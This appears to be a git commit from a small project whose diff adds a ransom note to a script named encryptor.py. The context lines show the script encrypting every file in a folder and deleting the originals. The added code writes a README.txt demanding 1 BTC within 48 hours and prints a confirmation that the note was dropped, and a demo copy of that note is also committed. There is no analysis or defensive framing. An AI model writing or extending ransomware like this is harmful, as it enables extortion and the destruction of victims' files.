95fac4ef1419d046f8272400ef981e34e3b5a175
enibody1 <uchenduphayvurh@gmail.com>
2025-04-10 07:04:40 -0400

    new push

---
+++ demo_files/README.txt
@@ -0,0 +1,6 @@
+
+--- YOUR FILES HAVE BEEN ENCRYPTED ---
+To recover your data, send 1 BTC to the following address:
+1A2b3C4d5E6f7G8h9I0j
+Then contact us with proof of payment.
+You have 48 hours before your files are lost forever.
--- encryptor.py
+++ encryptor.py
@@ -23,3 +23,15 @@ for filepath in glob.glob(folder + "*"):
         f.write(encrypted)
     os.remove(filepath)
 
+# Drop ransom note
+ransom_note = """
+--- YOUR FILES HAVE BEEN ENCRYPTED ---
+To recover your data, send 1 BTC to the following address:
+1A2b3C4d5E6f7G8h9I0j
+Then contact us with proof of payment.
+You have 48 hours before your files are lost forever."""
+
+with open(folder + "README.txt", "w") as f:
+    f.write(ransom_note)
+
+print("[+] Files encrypted. Ransom note dropped.")
